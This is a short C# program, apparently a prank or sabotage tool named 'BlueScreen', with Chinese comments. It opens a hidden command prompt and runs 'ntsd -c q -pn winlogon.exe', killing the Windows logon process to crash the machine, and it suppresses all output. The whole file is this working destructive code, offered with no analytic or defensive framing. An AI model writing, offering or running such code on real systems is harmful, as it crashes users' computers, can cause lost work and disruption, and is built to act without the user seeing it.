using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace Oreo.BlueScreen
{
    class Program
    {
        static void Main(string[] args)
        {

            string cmd = "ntsd -c q -pn winlogon.exe 1>nul 2>nul";

            Process p = new Process();  // 初始化新的进程
            p.StartInfo.FileName = "CMD.EXE"; //创建CMD.EXE 进程
            p.StartInfo.RedirectStandardInput = true; //重定向输入
            p.StartInfo.RedirectStandardOutput = true;//重定向输出
            p.StartInfo.UseShellExecute = false; // 不调用系统的Shell
            p.StartInfo.RedirectStandardError = true; // 重定向Error
            p.StartInfo.CreateNoWindow = true; //不创建窗口
            p.Start(); // 启动进程

            p.StandardInput.WriteLine(cmd + "&exit"); // Cmd 命令

            StreamReader reader = p.StandardOutput;//截取输出流
            string lines = "";
            int i = 0;
            while (!reader.EndOfStream)
            {
                string line = reader.ReadLine();//每次读取一行
                if (line != "")
                {

                    lines += "<" + line;
                    i++;
                }
            }
            p.WaitForExit();  // 等待退出
        }
    }
}
